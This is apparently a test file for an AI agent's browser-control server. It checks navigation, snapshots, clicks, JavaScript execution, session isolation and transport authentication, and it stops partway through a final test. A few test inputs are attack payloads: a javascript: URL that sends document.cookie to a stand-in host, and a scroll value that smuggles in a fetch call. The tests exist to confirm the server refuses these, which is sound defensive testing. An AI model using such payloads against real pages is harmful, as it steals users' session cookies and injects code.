/**
 * The browser server, driven the way the agent drives it.
 *
 * Everything here goes over the real JSON-RPC transport into the real
 * `McpBrowserServer`; only Electron is stood in for. The page is a scripted
 * `Runtime.evaluate` responder rather than a DOM, because what is being checked
 * is the decision the tool makes about what the page said: which ref it
 * resolves, whether it retries, whether it calls a thing that did not happen a
 * success. The page-side scripts need real layout and are covered by their own
 * contract tests in browser-snapshot.test.ts.
 *
 * The bar every case here holds the server to: never report success for
 * something that did not happen, and never act on a target the caller did not
 * name.
 */
import os from "os";
import path from "path";

import {
  afterAll,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from "vitest";

/** Expressions the page was asked to evaluate, in order, for the whole run. */
const evaluated: string[] = [];

/** What the fake page returns. Replaced per test; see `respondWith`. */
let responder: (expression: string) => unknown = () => null;

class FakeWebContents {
  id = 41;
  /** The agent session that owns this view; the default caller's. */
  sessionId: string | null = "session-1";
  url = "https://example.test/start";
  title = "Start";
  loading = false;
  destroyed = false;
  focused = 0;
  history: string[] = [];
  forwardStack: string[] = [];
  /** Set to make loadURL reject, the way an aborted navigation does. */
  loadRejects = false;
  /**
   * Set to make the load report a main-frame failure the way Chromium does:
   * `did-fail-load` fires and the error page is served at the requested URL.
   */
  loadFailure: { code: number; description: string } | null = null;

  readonly listeners = new Map<string, ((...args: unknown[]) => void)[]>();
  on(event: string, listener: (...args: unknown[]) => void): void {
    this.listeners.set(event, [...(this.listeners.get(event) ?? []), listener]);
  }
  off(event: string, listener: (...args: unknown[]) => void): void {
    this.listeners.set(
      event,
      (this.listeners.get(event) ?? []).filter((each) => each !== listener)
    );
  }
  emit(event: string, ...args: unknown[]): void {
    for (const listener of this.listeners.get(event) ?? []) listener(...args);
  }

  getType(): string {
    return "webview";
  }
  isDestroyed(): boolean {
    return this.destroyed;
  }
  getURL(): string {
    return this.url;
  }
  getTitle(): string {
    return this.title;
  }
  isLoading(): boolean {
    return this.loading;
  }
  focus(): void {
    this.focused += 1;
  }

  async loadURL(target: string): Promise<void> {
    if (this.loadRejects) throw new Error("ERR_ABORTED");
    const failure = this.loadFailure;
    if (failure != null) {
      // Chromium serves its error page at the URL that failed, so the view
      // still lands on the target host.
      this.url = target;
      this.loading = false;
      this.emit(
        "did-fail-load",
        {},
        failure.code,
        failure.description,
        target,
        true
      );

      return;
    }
    this.history.push(this.url);
    // Synchronous arrival is the friendly case; navigationSettled's "did it
    // actually leave" check is exercised through the URL changing.
    this.url = target;
    this.loading = false;
  }

  canGoBack(): boolean {
    return this.history.length > 0;
  }
  canGoForward(): boolean {
    return this.forwardStack.length > 0;
  }
  goBack(): void {
    const previous = this.history.pop();
    if (previous != null) {
      this.forwardStack.push(this.url);
      this.url = previous;
    }
  }
  goForward(): void {
    const next = this.forwardStack.pop();
    if (next != null) {
      this.history.push(this.url);
      this.url = next;
    }
  }
  reload(): void {
    this.loading = false;
  }

  async capturePage(): Promise<{ toPNG: () => Buffer }> {
    return { toPNG: () => Buffer.from("fallback-png") };
  }

  debugger = {
    attached: false,
    isAttached: (): boolean => this.debugger.attached,
    attach: (): void => {
      this.debugger.attached = true;
    },
    sendCommand: async (
      method: string,
      params?: Record<string, unknown>
    ): Promise<unknown> => {
      if (method === "Page.captureScreenshot")
        return { data: Buffer.from("png").toString("base64") };
      if (method === "Input.dispatchKeyEvent") return {};
      if (method !== "Runtime.evaluate") return {};

      const expression = String(params?.expression ?? "");
      evaluated.push(expression);
      const value = responder(expression);

      if (value instanceof Error) {
        return {
          exceptionDetails: { exception: { description: value.message } },
        };
      }

      return { result: { value } };
    },
  };
}

let page: FakeWebContents;
/** Views the fake Electron reports. Emptied to exercise the no-browser path. */
let liveViews: FakeWebContents[] = [];

/** Preview and cursor events the server sent to the renderer. */
const rendererEvents: unknown[] = [];

vi.mock("electron", () => ({
  app: { isPackaged: false, getPath: () => os.tmpdir() },
}));

/** The runtime's views, as the server asks for them. Reads `liveViews` live. */
const fakeTarget = {
  candidates: () =>
    liveViews.flatMap((view) => {
      try {
        if (view.isDestroyed()) return [];
        return [
          {
            id: view.id,
            url: view.getURL(),
            sessionId: view.sessionId,
            presented: true,
          },
        ];
      } catch {
        return [];
      }
    }),
  webContents: (id: number) =>
    (liveViews.find((view) => {
      try {
        return view.id === id;
      } catch {
        return false;
      }
    }) as unknown as Electron.WebContents) ?? null,
  /** Any session gets the one fake view, the way a hidden view is created for it. */
  materialize: async (): Promise<number | null> => {
    if (!materializeEnabled) return null;
    try {
      return liveViews[0]?.id ?? null;
    } catch {
      return null;
    }
  },
};
/** Off for the cases about a runtime that cannot create a view. */
let materializeEnabled = true;
vi.mock("#main/renderer-host", () => ({
  sendToRenderer: (_channel: string, payload: unknown) => {
    rendererEvents.push(payload);
  },
}));

let server: import("./mcp-browser-server").McpBrowserServer;
let port: number;
let token: string;

interface ToolResult {
  content: Array<{ text?: string }>;
  isError?: boolean;
}

const rpc = async (
  body: unknown,
  session = "session-1"
): Promise<{ result?: ToolResult; error?: unknown }> => {
  const res = await fetch(`http://127.0.0.1:${port}/mcp?session=${session}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify(body),
  });

  return (await res.json()) as { result?: ToolResult; error?: unknown };
};

let nextId = 0;
const call = async (
  name: string,
  args: Record<string, unknown>,
  session = "session-1"
): Promise<{ text: string; isError: boolean }> => {
  const response = await rpc(
    {
      jsonrpc: "2.0",
      id: ++nextId,
      method: "tools/call",
      params: { name, arguments: args },
    },
    session
  );
  const result = response.result;

  return {
    text: result?.content?.[0]?.text ?? "",
    isError: result?.isError === true,
  };
};

/** Point the fake page at a handler, and forget what was asked before. */
const respondWith = (handler: (expression: string) => unknown): void => {
  responder = handler;
  evaluated.length = 0;
};

/** A snapshot payload with one button, which most interaction cases start from. */
const oneButton = {
  title: "Start",
  url: "https://example.test/start",
  tree: {
    tag: "main",
    children: [{ ref: "@e1", selector: "#go", tag: "button", name: "Go" }],
  },
  refCount: 1,
  visibleCount: 1,
  offscreenCount: 0,
};

/** Take a snapshot so `@e1` is live for this session. */
const seedRefs = async (
  session = "session-1",
  payload: unknown = oneButton
): Promise<void> => {
  respondWith(() => payload);
  await call("browser_snapshot", { action: "snapshot" }, session);
};

beforeAll(async () => {
  process.env.ABACUSAI_BOT_HOME = path.join(
    os.tmpdir(),
    "abacusai-bot-browser-test"
  );
  const { McpBrowserServer } = await import("./mcp-browser-server");
  const { localMcpServerToken } = await import("./mcp-config-service");
  token = localMcpServerToken("browser");
  // A short attach wait: the no-browser cases below would otherwise spend
  // the full cold-launch timeout asleep.
  server = new McpBrowserServer({
    target: () => fakeTarget,
    timeouts: { attachMs: 300, navigateMs: 600, historyMs: 600 },
  });
  port = await server.start();
});

afterAll(() => server.stop());

beforeEach(() => {
  page = new FakeWebContents();
  liveViews = [page];
  materializeEnabled = true;
  rendererEvents.length = 0;
  responder = () => null;
  evaluated.length = 0;
});

describe("the transport", () => {
  it("refuses a call with no bearer token, so a page cannot drive the browser", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/list" }),
    });

    expect(res.status).toBe(401);
  });

  it("answers a health check without one", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/health`);

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ status: "ok", server: "browser" });
  });

  it("404s an unknown path", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/nope`, {
      headers: { Authorization: `Bearer ${token}` },
    });

    expect(res.status).toBe(404);
  });

  it("reports malformed JSON as a parse error rather than an internal one", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: "{ not json",
    });

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ error: { code: -32700 } });
  });

  it("advertises exactly the four browser tools", async () => {
    const res = await rpc({ jsonrpc: "2.0", id: 1, method: "tools/list" });
    const names = (
      res.result as unknown as { tools: Array<{ name: string }> }
    ).tools.map((t) => t.name);

    expect(names).toEqual([
      "browser_navigate",
      "browser_snapshot",
      "browser_interact",
      "browser_execute",
    ]);
  });

  it("handshakes and pings", async () => {
    expect(
      await rpc({ jsonrpc: "2.0", id: 1, method: "initialize" })
    ).toMatchObject({
      result: { serverInfo: { name: "browser" } },
    });
    expect(
      await rpc({ jsonrpc: "2.0", id: 2, method: "notifications/initialized" })
    ).toMatchObject({ result: {} });
    expect(await rpc({ jsonrpc: "2.0", id: 3, method: "ping" })).toMatchObject({
      result: {},
    });
  });

  it("reports an unknown method rather than failing silently", async () => {
    expect(
      await rpc({ jsonrpc: "2.0", id: 1, method: "resources/list" })
    ).toMatchObject({
      error: { code: -32601 },
    });
  });

  it("reports an unknown tool", async () => {
    const { text, isError } = await call("browser_teleport", {});

    expect(isError).toBe(true);
    expect(text).toContain("Unknown tool");
  });
});

describe("navigating", () => {
  it("goes where it was sent and says where it landed", async () => {
    const { text, isError } = await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/results",
    });

    expect(isError).toBe(false);
    expect(text).toContain("https://example.test/results");
    expect(page.url).toBe("https://example.test/results");
  });

  it("refuses a javascript: URL, which would run in the page already loaded", async () => {
    const { text, isError } = await call("browser_navigate", {
      action: "goto",
      url: 'javascript:fetch("https://evil.test/?c="+document.cookie)',
    });

    expect(isError).toBe(true);
    expect(text).toContain("Refusing");
    // The important half: it never reached the browser.
    expect(page.url).toBe("https://example.test/start");
  });

  it("refuses a data: URL for the same reason", async () => {
    const { isError } = await call("browser_navigate", {
      action: "goto",
      url: "data:text/html,<script>1</script>",
    });

    expect(isError).toBe(true);
  });

  it("asks for a URL rather than navigating to nothing", async () => {
    expect((await call("browser_navigate", { action: "goto" })).isError).toBe(
      true
    );
  });

  it("rejects an unknown navigate action", async () => {
    expect(
      (await call("browser_navigate", { action: "teleport" })).isError
    ).toBe(true);
  });

  it("treats a url with no action as a goto", async () => {
    const { isError } = await call("browser_navigate", {
      url: "https://example.test/direct",
    });

    expect(isError).toBe(false);
    expect(page.url).toBe("https://example.test/direct");
  });

  it("says there is nowhere to go back to instead of reporting a move", async () => {
    const { text, isError } = await call("browser_navigate", {
      action: "back",
    });

    expect(isError).toBe(true);
    expect(text).toContain("no page to go back to");
  });

  it("goes back and reports the page it actually reached", async () => {
    await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/second",
    });
    const { text, isError } = await call("browser_navigate", {
      action: "back",
    });

    expect(isError).toBe(false);
    // Not just "Navigated back": these used to return before the view moved.
    expect(text).toContain("https://example.test/start");
    expect(page.url).toBe("https://example.test/start");
  });

  it("goes forward again", async () => {
    await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/second",
    });
    await call("browser_navigate", { action: "back" });
    const { text } = await call("browser_navigate", { action: "forward" });

    expect(text).toContain("https://example.test/second");
  });

  it("says there is nowhere to go forward to", async () => {
    expect(
      (await call("browser_navigate", { action: "forward" })).isError
    ).toBe(true);
  });

  it("reloads, and waits rather than claiming the page came back instantly", async () => {
    const { text, isError } = await call("browser_navigate", {
      action: "reload",
    });

    expect(isError).toBe(false);
    expect(text).toContain("reloaded");
  });

  it("survives loadURL rejecting, which is the normal outcome of the renderer racing it", async () => {
    page.loadRejects = true;
    const { isError } = await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/start",
    });

    // Same URL, aborted load: the grace period settles it rather than hanging
    // for the whole navigation timeout.
    expect(isError).toBe(false);
  });

  it("reports a page that failed to load, not the error page it landed on", async () => {
    page.loadFailure = {
      code: -337,
      description: "ERR_HTTP2_PROTOCOL_ERROR",
    };
    const { text, isError } = await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/blocked",
    });

    expect(isError).toBe(true);
    expect(text).toContain("ERR_HTTP2_PROTOCOL_ERROR (-337)");
    expect(text).toContain("Try a different source");
  });

  it("drops the refs of every session, because they all share the pane", async () => {
    await seedRefs("session-1");
    await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/elsewhere",
    });

    respondWith(() => ({ status: "ok" }));
    const { text, isError } = await call(
      "browser_interact",
      { action: "click", ref: "@e1" },
      "session-1"
    );

    expect(isError).toBe(true);
    expect(text).toContain("browser_snapshot");
  });
});

describe("snapshotting", () => {
  it("renders the tree and registers its refs", async () => {
    respondWith(() => oneButton);
    const { text } = await call("browser_snapshot", { action: "snapshot" });

    expect(text).toContain('@e1 [button] "Go"');
    expect(text).toContain("1 visible, 0 offscreen");
  });

  it("explains an empty page instead of only suggesting a fallback that fails the same way", async () => {
    respondWith(() => ({
      title: "Shell",
      url: "https://example.test/app",
      tree: null,
      refCount: 0,
    }));
    const { text } = await call("browser_snapshot", { action: "snapshot" });

    expect(text).toContain("still be loading");
    expect(text).toContain("shadow root");
  });

  it("returns page text", async () => {
    respondWith(() => "Hello from the page");
    const { text } = await call("browser_snapshot", { action: "text" });

    expect(text).toBe("Hello from the page");
  });

  it("says which selector matched nothing rather than returning empty text", async () => {
    respondWith(() => null);
    const { text, isError } = await call("browser_snapshot", {
      action: "text",
      selector: "#missing",
    });

    expect(isError).toBe(true);
    expect(text).toContain("#missing");
  });

  it("truncates very long text rather than returning a whole document", async () => {
    respondWith(() => "x".repeat(30_000));
    const { text } = await call("browser_snapshot", { action: "text" });

    expect(text).toContain("...(truncated)");
    expect(text.length).toBeLessThan(21_000);
  });

  it("reports the URL and title", async () => {
    expect((await call("browser_snapshot", { action: "url" })).text).toBe(
      "https://example.test/start"
    );
    expect((await call("browser_snapshot", { action: "title" })).text).toBe(
      "Start"
    );
  });

  it("returns a screenshot as an image, with where the page is and the file path", async () => {
    respondWith(() => ({
      title: "Start",
      url: "https://example.test/start",
      headings: ["Welcome"],
      focused: null,
      dialogs: [],
      text: "Hello there",
      scrolled: 0,
      pageHeight: 800,
      viewportHeight: 768,
    }));
    const response = await rpc({
      jsonrpc: "2.0",
      id: ++nextId,
      method: "tools/call",
      params: { name: "browser_snapshot", arguments: { action: "screenshot" } },
    });
    const content = response.result?.content ?? [];

    expect(response.result?.isError).not.toBe(true);
    // capturePage first: it paints a hidden view, which a bot's browser is.
    expect(content[0]).toMatchObject({ type: "image", mimeType: "image/png" });
    expect(content[1]?.text).toContain("Headings: Welcome");
    expect(content[1]?.text).toMatch(/screenshot-\d+\.png$/);
  });

  it("rejects an unknown snapshot action, naming the ones that exist", async () => {
    const { text, isError } = await call("browser_snapshot", {
      action: "photograph",
    });
    expect(isError).toBe(true);
    expect(text).toMatch(/extract/);
  });

  it('reads action:"find" as a snapshot with that filter', async () => {
    // A model that saw find in the description calls it as the action; the
    // refusal cost the sub-agent two turns and sent it to raw JavaScript.
    respondWith(() => oneButton);
    const { text, isError } = await call("browser_snapshot", {
      action: "find",
      find: "Go",
    });

    expect(isError).toBe(false);
    expect(text).toContain('matching "Go"');
    expect(text).toContain("@e1");
  });
});

describe("interacting", () => {
  it("clicks a live ref and reports where", async () => {
    await seedRefs();
    respondWith(() => ({
      status: "ok",
      tag: "button",
      text: "Go",
      x: 10,
      y: 20,
    }));
    const { text, isError } = await call("browser_interact", {
      action: "click",
      ref: "@e1",
    });

    expect(isError).toBe(false);
    expect(text).toContain("(10,20)");
  });

  it("refuses a ref the current snapshot never issued", async () => {
    await seedRefs();
    evaluated.length = 0;
    const { text, isError } = await call("browser_interact", {
      action: "click",
      ref: "@e99",
    });

    expect(isError).toBe(true);
    expect(text).toContain("@e99");
    // And it never asked the page to do anything.
    expect(evaluated).toHaveLength(0);
  });

  it("will not type into whatever is focused when the ref is stale", async () => {
    // The failure this whole class of fix exists for: `type` used to fall back
    // to document.activeElement, so text meant for one field went to another.
    await seedRefs();
    respondWith(() => ({ status: "ok" }));
    const { isError } = await call("browser_interact", {
      action: "type",
      ref: "@e99",
      text: "hello",
    });

    expect(isError).toBe(true);
    expect(evaluated).toHaveLength(0);
  });

  it("will not scroll the window when the ref is stale", async () => {
    await seedRefs();
    respondWith(() => ({ dx: 0, dy: 500 }));
    const { isError } = await call("browser_interact", {
      action: "scroll",
      ref: "@e99",
    });

    expect(isError).toBe(true);
    expect(evaluated).toHaveLength(0);
  });

  it("will not turn a stale ref into a plain sleep reported as a wait", async () => {
    await seedRefs();
    const { isError } = await call("browser_interact", {
      action: "wait",
      ref: "@e99",
      amount: 10,
    });

    expect(isError).toBe(true);
  });

  it("says a ref is required when none was given", async () => {
    const { text, isError } = await call("browser_interact", {
      action: "click",
    });

    expect(isError).toBe(true);
    expect(text).toContain("ref is required");
  });

  it("reports an element that vanished between snapshot and click", async () => {
    await seedRefs();
    // The retry's fresh snapshot finds nothing either: the element is gone.
    respondWith((expression) =>
      expression.includes("el.click()")
        ? { status: "not_found" }
        : { ...oneButton, tree: { tag: "main", children: [] }, refCount: 0 }
    );
    const { text, isError } = await call("browser_interact", {
      action: "click",
      ref: "@e1",
    });

    expect(isError).toBe(true);
    expect(text).toContain("not found");
  });

  it("retries once with fresh refs when the page re-rendered under a ref", async () => {
    await seedRefs();
    let clicks = 0;
    respondWith((expression) => {
      // The cursor animation also asks about #go; only the click script clicks.
      if (!expression.includes("el.click()")) return oneButton;
      clicks += 1;

      return clicks === 1
        ? { status: "not_found" }
        : { status: "ok", tag: "button", text: "Go", x: 10, y: 20 };
    });
    const { text, isError } = await call("browser_interact", {
      action: "click",
      ref: "@e1",
    });

    expect(isError).toBe(false);
    expect(clicks).toBe(2);
    expect(text).toContain("re-rendered");
    expect(text).toContain("(10,20)");
  });

  it("refuses to call a click on a disabled control a click", async () => {
    await seedRefs();
    respondWith(() => ({ status: "disabled", tag: "button" }));
    const { text, isError } = await call("browser_interact", {
      action: "click",
      ref: "@e1",
    });

    expect(isError).toBe(true);
    expect(text).toContain("disabled");
  });

  it("fills an input", async () => {
    await seedRefs();
    respondWith(() => ({ status: "ok" }));
    const { text, isError } = await call("browser_interact", {
      action: "fill",
      ref: "@e1",
      text: "hello",
    });

    expect(isError).toBe(false);
    expect(text).toContain('"hello"');
  });

  it("names the real problem when the ref points at something with no value", async () => {
    // This used to surface as "Illegal invocation" from inside the page.
    await seedRefs();
    respondWith(() => ({ status: "not_fillable", tag: "div" }));
    const { text, isError } = await call("browser_interact", {
      action: "fill",
      ref: "@e1",
      text: "hi",
    });

    expect(isError).toBe(true);
    expect(text).toContain("<div>");
  });

  it("reports a read-only field rather than a successful fill", async () => {
    await seedRefs();
    respondWith(() => ({ status: "not_editable", tag: "input" }));
    expect(
      (
        await call("browser_interact", {
          action: "fill",
          ref: "@e1",
          text: "hi",
        })
      ).isError
    ).toBe(true);
  });

  it("reports a framework that reset the value", async () => {
    await seedRefs();
    respondWith(() => ({ status: "rejected" }));
    const { text, isError } = await call("browser_interact", {
      action: "fill",
      ref: "@e1",
      text: "hi",
    });

    expect(isError).toBe(true);
    expect(text).toContain("reset its value");
  });

  it("requires text to fill with", async () => {
    await seedRefs();
    expect(
      (await call("browser_interact", { action: "fill", ref: "@e1" })).isError
    ).toBe(true);
  });

  it("types into the focused element when no target was named at all", async () => {
    respondWith(() => ({ status: "ok" }));
    const { isError } = await call("browser_interact", {
      action: "type",
      text: "hello",
    });

    expect(isError).toBe(false);
  });

  it("says nothing is focused rather than reporting a phantom keystroke", async () => {
    respondWith(() => ({ status: "not_found" }));
    const { text, isError } = await call("browser_interact", {
      action: "type",
      text: "hello",
    });

    expect(isError).toBe(true);
    expect(text).toContain("Nothing is focused");
  });

  it("selects an option and reports what took", async () => {
    await seedRefs();
    respondWith(() => ({ status: "ok", selected: "in" }));
    const { text, isError } = await call("browser_interact", {
      action: "select",
      ref: "@e1",
      value: "in",
    });

    expect(isError).toBe(false);
    expect(text).toContain('"in"');
  });

  it("refuses to call an unmatched option a selection, and lists what was there", async () => {
    // Assigning an unmatched value to a <select> silently clears it.
    await seedRefs();
    respondWith(() => ({ status: "no_match", options: ["us", "in"] }));
    const { text, isError } = await call("browser_interact", {
      action: "select",
      ref: "@e1",
      value: "zz",
    });

    expect(isError).toBe(true);
    expect(text).toContain("us, in");
  });

  it("reports a ref that is not a select", async () => {
    await seedRefs();
    respondWith(() => ({ status: "not_found" }));
    expect(
      (
        await call("browser_interact", {
          action: "select",
          ref: "@e1",
          value: "x",
        })
      ).isError
    ).toBe(true);
  });

  it("requires a value to select", async () => {
    await seedRefs();
    expect(
      (await call("browser_interact", { action: "select", ref: "@e1" })).isError
    ).toBe(true);
  });

  it("hovers", async () => {
    await seedRefs();
    respondWith(() => "ok");
    expect(
      (await call("browser_interact", { action: "hover", ref: "@e1" })).isError
    ).toBe(false);
  });

  it("scrolls and reports the distance actually covered", async () => {
    respondWith(() => ({ dx: 0, dy: 340 }));
    const { text } = await call("browser_interact", {
      action: "scroll",
      direction: "down",
    });

    expect(text).toContain("340px");
  });

  it("admits when the page would not move, instead of inviting an endless scroll", async () => {
    respondWith(() => ({ dx: 0, dy: 0 }));
    const { text } = await call("browser_interact", {
      action: "scroll",
      direction: "down",
    });

    expect(text).toContain("already at the down limit");
  });

  it("coerces a scroll amount that is not a number, rather than splicing it into the page", async () => {
    respondWith(() => ({ dx: 0, dy: 500 }));
    await call("browser_interact", {
      action: "scroll",
      amount: '0); fetch("https://evil.test"); (0',
    });

    expect(evaluated.join("\n")).not.toContain("evil.test");
  });

  it("scrolls an element into view", async () => {
    await seedRefs();
    respondWith(() => "ok");
    expect(
      (
        await call("browser_interact", {
          action: "scroll_into_view",
          ref: "@e1",
        })
      ).isError
    ).toBe(false);
  });

  it("focuses an element", async () => {
    await seedRefs();
    respondWith(() => "ok");
    expect(
      (await call("browser_interact", { action: "focus", ref: "@e1" })).isError
    ).toBe(false);
  });

  it("reports an element that would not take focus, since the next step is usually to type", async () => {
    await seedRefs();
    respondWith(() => "not_focusable");
    const { text, isError } = await call("browser_interact", {
      action: "focus",
      ref: "@e1",
    });

    expect(isError).toBe(true);
    expect(text).toContain("not a focusable element");
  });

  it("checks a checkbox", async () => {
    await seedRefs();
    respondWith(() => "ok");
    expect(
      (await call("browser_interact", { action: "check", ref: "@e1" })).isError
    ).toBe(false);
  });

  it("reports a checkbox a framework reverted", async () => {
    await seedRefs();
    respondWith(() => "unchanged");
    const { text, isError } = await call("browser_interact", {
      action: "uncheck",
      ref: "@e1",
    });

    expect(isError).toBe(true);
    expect(text).toContain("still checked");
  });

  it("presses a key through the debugger, which is what makes Enter submit", async () => {
    // The probe reports the key arrived, so no synthetic fallback is needed.
    respondWith((expression) =>
      expression.includes("__abacusBotKeySeen ===") ? true : null
    );
    const { text, isError } = await call("browser_interact", {
      action: "press",
      key: "Enter",
    });

    expect(isError).toBe(false);
    expect(text).toContain("Pressed Enter");
  });

  it("falls back to synthetic events when the trusted key is not delivered", async () => {
    respondWith((expression) =>
      expression.includes("__abacusBotKeySeen ===") ? false : null
    );
    const { isError } = await call("browser_interact", {
      action: "press",
      key: "Enter",
    });

    expect(isError).toBe(false);
    expect(evaluated.join("\n")).toContain("new KeyboardEvent");
  });

  it("requires a key to press", async () => {
    expect((await call("browser_interact", { action: "press" })).isError).toBe(
      true
    );
  });

  it("waits for an element to appear", async () => {
    await seedRefs();
    respondWith(() => true);
    expect(
      (await call("browser_interact", { action: "wait", ref: "@e1" })).isError
    ).toBe(false);
  });

  it("reports a wait that timed out rather than continuing as if it had not", async () => {
    await seedRefs();
    respondWith(() => false);
    expect(
      (await call("browser_interact", { action: "wait", ref: "@e1" })).isError
    ).toBe(true);
  });

  it("waits for text, and reports a miss", async () => {
    respondWith(() => true);
    expect(
      (await call("browser_interact", { action: "wait", text: "Results" }))
        .isError
    ).toBe(false);
    respondWith(() => false);
    expect(
      (await call("browser_interact", { action: "wait", text: "Results" }))
        .isError
    ).toBe(true);
  });

  it("waits for a URL pattern, and reports a miss", async () => {
    respondWith(() => true);
    expect(
      (
        await call("browser_interact", {
          action: "wait",
          url_pattern: "**/results**",
        })
      ).isError
    ).toBe(false);
    respondWith(() => false);
    expect(
      (
        await call("browser_interact", {
          action: "wait",
          url_pattern: "**/results**",
        })
      ).isError
    ).toBe(true);
  });

  it("falls back to a plain sleep when nothing was named", async () => {
    const { text } = await call("browser_interact", {
      action: "wait",
      amount: 10,
    });

    expect(text).toContain("Waited");
  });

  it("rejects an unknown interact action", async () => {
    expect((await call("browser_interact", { action: "juggle" })).isError).toBe(
      true
    );
  });
});

describe("running JavaScript in the page", () => {
  it("returns a bare expression as its value", async () => {
    respondWith(() => "Example Domain");
    const { text } = await call("browser_execute", { code: "document.title" });

    expect(text).toBe('"Example Domain"');
    expect(evaluated[0]).toContain("return (document.title)");
  });

  it("runs code that already returns exactly once", async () => {
    respondWith(() => 7);
    const { text } = await call("browser_execute", {
      code: "const a = 3; return a + 4",
    });

    expect(text).toBe("7");
    expect(evaluated).toHaveLength(1);
  });

  it("does not run a side effect twice when it evaluates to undefined", async () => {
    // The bug: `el.click()` returns undefined, the old retry ran it again, and
    // the button was clicked twice.
    respondWith(() => undefined);
    const { text } = await call("browser_execute", {
      code: 'document.querySelector("#buy").click()',
    });

    expect(text).toBe("undefined");
    expect(evaluated).toHaveLength(1);
  });

  it("retries as a statement body when the expression form will not parse", async () => {
    let seen = 0;
    respondWith((expression) => {
      seen += 1;
      return expression.includes("return (")
        ? new Error("SyntaxError: Unexpected token")
        : "recovered";
    });
    const { text } = await call("browser_execute", {
      code: "let a = 1; a + 1",
    });

    expect(seen).toBe(2);
    expect(text).toBe('"recovered"');
  });

  it("does not retry a genuine page error, which would run the code twice", async () => {
    respondWith(() => new Error("TypeError: Cannot read properties of null"));
    const { text, isError } = await call("browser_execute", {
      code: 'document.querySelector("#x").click()',
    });

    expect(isError).toBe(true);
    expect(text).toContain("TypeError");
    expect(evaluated).toHaveLength(1);
  });

  it("requires code", async () => {
    expect((await call("browser_execute", {})).isError).toBe(true);
  });

  it("truncates an enormous result", async () => {
    respondWith(() => "y".repeat(30_000));
    const { text } = await call("browser_execute", {
      code: "document.body.innerHTML",
    });

    expect(text).toContain("...(truncated)");
  });
});

describe("keeping sessions apart", () => {
  it("does not let one session resolve a ref against another session's page", async () => {
    // Both sessions snapshot; each holds @e1 pointing at a different element.
    await seedRefs("session-a", {
      ...oneButton,
      tree: {
        tag: "main",
        children: [{ ref: "@e1", selector: "#buy-on-a", tag: "button" }],
      },
    });
    await seedRefs("session-b", {
      ...oneButton,
      tree: {
        tag: "main",
        children: [{ ref: "@e1", selector: "#delete-on-b", tag: "button" }],
      },
    });

    respondWith(() => ({ status: "ok", tag: "button", text: "", x: 1, y: 2 }));
    await call(
      "browser_interact",
      { action: "click", ref: "@e1" },
      "session-a"
    );

    // Session A must still be clicking its own element, not B's.
    expect(evaluated.join("\n")).toContain("#buy-on-a");
    expect(evaluated.join("\n")).not.toContain("#delete-on-b");
  });

  it("leaves one session's refs alone when another session snapshots", async () => {
    await seedRefs("session-a");
    await seedRefs("session-b");

    respondWith(() => ({ status: "ok", tag: "button", text: "", x: 1, y: 2 }));
    expect(
      (
        await call(
          "browser_interact",
          { action: "click", ref: "@e1" },
          "session-a"
        )
      ).isError
    ).toBe(false);
  });
});

describe("with no browser pane at all", () => {
  it("says so once, and tells the agent what to use instead", async () => {
    liveViews = [];
    const { text, isError } = await call("browser_snapshot", {
      action: "snapshot",
    });

    expect(isError).toBe(true);
    expect(text).toContain("web_fetch");
    expect(text).toContain("Do not retry in a loop");
  }, 20_000);

  it("answers within a short grace after the first wait, not the full timeout", async () => {
    // Not instant: each call keeps re-asking the renderer for a pane with a
    // small grace, so a pane that shows up later is picked up. What must not
    // happen is paying the full attach timeout on every call again.
    liveViews = [];
    const startedAt = Date.now();
    const { isError } = await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/x",
    });

    expect(isError).toBe(true);
    expect(Date.now() - startedAt).toBeLessThan(1_000);
  });
});

describe("the transport, at its edges", () => {
  it("answers a CORS preflight without granting an origin", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
      method: "OPTIONS",
    });

    expect(res.status).toBe(204);
    // No wildcard origin: this server is for the agent, and a header here
    // would let any page the user browsed call tools/call on loopback.
    expect(res.headers.get("access-control-allow-origin")).toBeNull();
  });

  it("rejects a method it does not speak", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
      method: "PUT",
      headers: { Authorization: `Bearer ${token}` },
    });

    expect(res.status).toBe(405);
  });

  it("opens an SSE stream and hands back an endpoint to post to", async () => {
    const controller = new AbortController();
    const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
      headers: { Authorization: `Bearer ${token}` },
      signal: controller.signal,
    });

    expect(res.headers.get("content-type")).toContain("text/event-stream");

    const reader = res.body!.getReader();
    const first = new TextDecoder().decode((await reader.read()).value);

    expect(first).toContain("event: endpoint");
    expect(first).toMatch(/sessionId=session-\d+/);

    const sessionId = /sessionId=(session-\d+)/.exec(first)![1];

    // A post naming that session is answered over the stream, and the POST
    // itself just acknowledges.
    const posted = await fetch(
      `http://127.0.0.1:${port}/mcp?sessionId=${sessionId}`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "ping" }),
      }
    );

    expect(posted.status).toBe(202);
    expect(new TextDecoder().decode((await reader.read()).value)).toContain(
      "event: message"
    );

    const deleted = await fetch(
      `http://127.0.0.1:${port}/mcp?sessionId=${sessionId}`,
      {
        method: "DELETE",
        headers: { Authorization: `Bearer ${token}` },
      }
    );

    expect(deleted.status).toBe(200);
    controller.abort();
  });

  it("tolerates a DELETE for a session that is already gone", async () => {
    const res = await fetch(
